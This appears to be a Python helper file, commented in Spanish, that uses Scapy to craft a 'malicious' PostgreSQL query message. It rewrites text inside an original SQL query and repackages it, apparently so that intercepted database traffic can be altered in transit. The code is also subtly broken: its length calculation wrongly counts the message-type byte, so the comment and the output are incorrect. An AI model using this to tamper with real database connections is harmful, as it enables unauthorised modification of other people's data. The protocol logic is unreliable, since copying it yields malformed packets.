# psql_utils.py
# Este archivo contiene funciones de utilidad para manipular paquetes PostgreSQL (PSQL)
# usando Scapy.

from scapy.all import *

def craft_malicious_psql_query(original_sql: str, replacement_text: str, target_text: str) -> bytes:
    """
    Crea una carga útil de mensaje de consulta PSQL modificada.

    Args:
        original_sql (str): La cadena SQL original que se va a modificar.
        replacement_text (str): El texto con el que se reemplazará el target_text.
        target_text (str): El texto dentro de la consulta original que se buscará y reemplazará.

    Returns:
        bytes: La carga útil de bytes del mensaje de consulta PSQL modificado,
               incluyendo el tipo de mensaje ('Q'), la longitud y la cadena SQL.
    """
    # Realiza el reemplazo de la cadena SQL.
    modified_sql = original_sql.replace(target_text, replacement_text)
    print(f"DEBUG: SQL modificado: {modified_sql}")

    # Reconstruye el mensaje de consulta PSQL.
    # Formato: 'Q' (1 byte) + Longitud (4 bytes) + Cadena SQL + Terminador nulo (1 byte)
    
    # Codifica la SQL modificada a bytes.
    modified_sql_bytes = modified_sql.encode('utf-8')

    # Calcula la nueva longitud del mensaje PSQL.
    # +1 para el tipo de mensaje 'Q', +4 para el campo de longitud, +1 para el terminador nulo.
    new_length = len(modified_sql_bytes) + 1 + 4 + 1 

    # Convierte la longitud a 4 bytes big-endian.
    length_bytes = new_length.to_bytes(4, 'big')

    # Combina para formar la nueva carga útil del mensaje PSQL.
    new_psql_payload = b'Q' + length_bytes + modified_sql_bytes + b'\x00'
    return new_psql_payload
